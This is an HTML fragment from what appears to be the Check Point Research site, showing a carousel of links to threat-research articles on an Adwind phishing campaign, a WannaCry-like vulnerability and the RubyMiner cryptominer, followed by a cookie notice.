														<a class="image background-image--" href="https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg')" tabindex="0">
								<img src="https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>																	<li>Global Cyber Attack Reports</li>																	<li>Threat Research</li>															</ul>
							<div class="text">
								<span class="date small-font">February 17, 2020</span>
								<h3>“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide" data-slick-index="1" aria-hidden="true" tabindex="-1" role="option" aria-describedby="slick-slide01">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide" data-slick-index="2" aria-hidden="true" tabindex="-1" role="option" aria-describedby="slick-slide02">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">January 11, 2018</span>
								<h3>‘RubyMiner’ Cryptominer Affects 30% of WW Networks</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-cloned slick-center" data-slick-index="3" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>																	<li>Global Cyber Attack Reports</li>																	<li>Threat Research</li>															</ul>
							<div class="text">
								<span class="date small-font">February 17, 2020</span>
								<h3>“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-cloned" data-slick-index="4" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div></div></div>
														
														
								
			<ul class="slick-dots" style="" role="tablist"><li class="slick-active" aria-hidden="false" role="presentation" aria-selected="true" aria-controls="navigation00" id="slick-slide00"><button type="button" data-role="none" role="button" tabindex="0">1</button></li><li aria-hidden="true" role="presentation" aria-selected="false" aria-controls="navigation01" id="slick-slide01"><button type="button" data-role="none" role="button" tabindex="0">2</button></li><li aria-hidden="true" role="presentation" aria-selected="false" aria-controls="navigation02" id="slick-slide02"><button type="button" data-role="none" role="button" tabindex="0">3</button></li></ul></div>
			<div class="progress blog-most-recent-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
				<span class="slider__label sr-only blog-recent-bar"> </span>
			</div>
		</div>	
</section>






<div id="cookies-notice" class="cookies-notice background-white" style="display: block;">
	<div class="container container-wide">
		<div class="flex-row">
			<div class="flex-8">
				<div class="text text-black"><h2>We value your privacy!</h2>
<p>BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.</p>
				</div>
			</div>
			<div class="flex-4">
				<div class="button-wrap justify-content-end">
					<div id="cn-accept-cookies" class="button font-white background-skyblue skyblue-border margin-right">ACCEPT</div>
					<div class="button transparent cookie-close font-white skyblue-border skyblue-font">REJECT</div>
				</div>
			</div>
			<div class="close-button cookie-close svg">
				<svg xmlns="http://www.w3.org/2000/svg" width="16.828" height="16.828" viewBox="0 0 16.828 16.828">
					<g id="Group_163304" data-name="Group 163304" transform="translate(1.414 1.414)"><line id="Line_323" data-name="Line 323" x2="14" y2="14" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="2"></line><line id="Line_324" data-name="Line 324" x1="14" y2="14" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="2"></line></g></svg>
				</div>
			</div>
		</div>
	</div>
















</body></html>